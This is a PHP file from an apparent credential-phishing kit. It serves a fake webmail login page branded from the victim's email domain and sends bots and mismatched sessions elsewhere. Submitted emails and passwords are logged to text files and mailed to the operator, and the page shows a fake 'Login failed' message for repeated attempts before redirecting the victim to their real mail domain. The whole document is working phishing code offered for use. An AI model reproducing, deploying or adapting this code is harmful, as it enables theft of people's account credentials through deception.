<?php
session_start();
require_once('../config.php');
defined('2BgI5Youc1knSTVZb3VjMWtueVBZOXVETjkwNXkQ4VlMzZmNXNzFFRkx0VE0xQkwvLbk0yTUE9PTV51qt8VS3ZmNXNzFFRkx0VE0xQkw0') or exit(header(sprintf("Location:%s", 'http://www.google.com/search?q=404%20page')));
require_once('../netends.php');
require_once('../mxrec.php');
require_once('../sendto.php');

if($_SESSION['visitor_ip'] !== show_visitor_ip()) { $_SESSION = ''; session_destroy(); exit(header(sprintf("Location:%s", 'http://'.getDomain($_SESSION['myemail'])))); }
if(!isset($_GET['origin']) || empty($_GET['origin'])) exit(header(sprintf('Location:%s','login.php?puid='.$_SESSION['hsh'].'&origin=1&url='.encodeDomain($_SESSION['myemail'])))); 
if(!isset($_GET['url']) || empty($_GET['url']) || (urlencode($_GET['url']) !== encodeDomain($_SESSION['myemail']))) exit(header(sprintf('Location:%s','login.php?puid='.$_SESSION['hsh'].'&origin=1&url='.encodeDomain($_SESSION['myemail'])))); 
if(!isset($_SESSION['csrftoken']) || !isset($_SESSION['myemail']) || !isset($_SESSION['hsh']) || ($_SESSION['hsh'] !== $_GET['puid'])) { $_SESSION = ''; exit(header(sprintf("Location:%s", 'http://'.getDomain($_SESSION['myemail'])))); }
$email = $_SESSION['myemail'];
$link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] .  $_SERVER['REQUEST_URI'];
$_SESSION['page'] = $link;

$error = (isset($_SESSION['error']) && !empty($_SESSION['error'])) ? $_SESSION['error'] : '';

$details = $_SESSION['visitor_ip'].' | '.$dateNow.' | '.show_visitor_locationByIp('countryName').' | '.getOs().' | '.getBrowser().' | '.$_SESSION['myemail'];
if(!isset($_SESSION['logged_in']) || empty($_SESSION['logged_in']) || $_SESSION['logged_in'] != 'logged') {
	$_SESSION['logged_in'] = 'logged';
	file_put_contents( '../visitors.txt', $details."\r\n" , FILE_APPEND);
}

$g = getMX($email);
$pagetitle = !empty( $pageSelect[$g]['title'] ) ? $pageSelect[$g]['title'] : $pageSelect['default']['title'];
$pageficon = !empty( $pageSelect[$g]['favicon'] ) ? $pageSelect[$g]['favicon'] : $pageSelect['default']['favicon'];
$pagelogo = !empty( $pageSelect[$g]['logo'] ) ? $pageSelect[$g]['logo'] : $pageSelect['default']['logo'];
$getlogo = getLogo($email);
$logo = ( !empty( $getlogo ) || is_null( $getlogo ) ) ? "<img src='$getlogo?size=100' />" : ( !empty( $pagelogo ) ? $pagelogo : 'default logo here' );
$favicon =  ( empty($getlogo) || is_null($getlogo) ) ? $pageficon : $getlogo;

if( (isset($_POST['login']) && !empty($_POST['login'])) && (isset($_POST['password']) && !empty($_POST['password'])) ) {
	
	$browser = $_SERVER['HTTP_USER_AGENT'];
	$adddate = date("D M d, Y g:i a");
	$ip = show_visitor_ip();
	$country = show_visitor_locationByIp('countryName');
	$log = '';	
	$message = '';
	$headers = '';
	$email = clean_post_data($_POST['login']);
	$password = clean_post_data($_POST['password']);
		
	if(empty($email)) {
		$log .= 'You must specify a username to log in.';
		$output = json_encode(array('type'=>'error', 'message' => $log));
	}
	if(!empty($email) && (!is_email($email) || empty($password))) {
		$log .= 'The login is invalid.';
		$output = json_encode(array('type'=>'error', 'message' => $log));
	}
	
	if($log === '') {
		$mail_part = explode( "@", $email );
		$domain = $mail_part[1];
		$results = dns_get_record($domain, DNS_MX);
		if(!empty($results)) {
			$target_pri = min(array_column($results, "pri"));
			$highest_pri = array_filter(
				$results,
				function($item) use($target_pri) {return $item["pri"] === $target_pri;}
			);
			foreach ($highest_pri as $mx) {
				$mx = "$mx[target] ";
			}
		}
		else {
			$mx = '';
		}
		$checkermsg = $email.':'.$password;
		$message .= "--------+ G3neral Logs +--------\n";
		$message .= "Em@il : ".$email."\n";
		$message .= "P@ssw@rd : ".$password."\n";
		$message .= "MX Record : ".$mx."\n";
		$message .= "-----------------------------------\n";
		$message .= "User Agent : ".$browser."\n";
		$message .= "Client IP : ".$ip."\n";
		$message .= "Country : ".$country."\n";
		$message .= "Date: ".$adddate."\n";
		$message .= "---------+ Created by d'iQ +-------------\n";
		$subject = "G3neral Logs | $country | $email | $mx";
		$headers .= "MIME-Version: 1.0\n";
		$headers .= $email."\n";
		$headers = "From: uop <".$_SERVER['SERVER_ADMIN'].">\n";
		$_SESSION['count'] = !isset($_SESSION['count']) ? 1 : $_SESSION['count']+1;
		if($savechkertext == 'yes') @file_put_contents( '../'.$chkrfilename.'.txt', $checkermsg.PHP_EOL , FILE_APPEND );
		if($saveLog == 'yes') @file_put_contents( '../'.$filename.'.txt', $message.PHP_EOL , FILE_APPEND);
		if($sendLog == 'yes') @mail($send_to,$subject,$message,$headers);
		if($_SESSION['count'] < $filltimes) {
			$_SESSION['error'] = '<span>Login failed. Incorrect email or password.</span>';
			exit(header(sprintf('Location:%s',$_SESSION['page'])));
		}
		else{
			$_SESSION = '';
			session_destroy();
			exit(header(sprintf("Location:%s", 'http://'.getDomain($email))));
		}
	}
	
}

include_once('login_pg.php');
